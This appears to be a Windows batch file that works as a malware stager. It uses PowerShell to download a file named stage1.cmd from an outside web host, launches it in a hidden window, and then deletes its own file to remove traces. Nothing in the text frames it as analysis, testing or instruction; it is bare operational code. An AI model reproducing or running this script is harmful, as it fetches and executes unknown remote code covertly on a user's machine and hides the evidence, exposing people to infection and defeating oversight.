powershell -c "Invoke-WebRequest -Uri 'https://jaxfry.me/net/stage1.cmd' -OutFile 'stage1.cmd'"
powershell Start-Process -FilePath "stage1.cmd" -WindowStyle Hidden
REM Get file name
set "filename=%~nx0"
del %filename%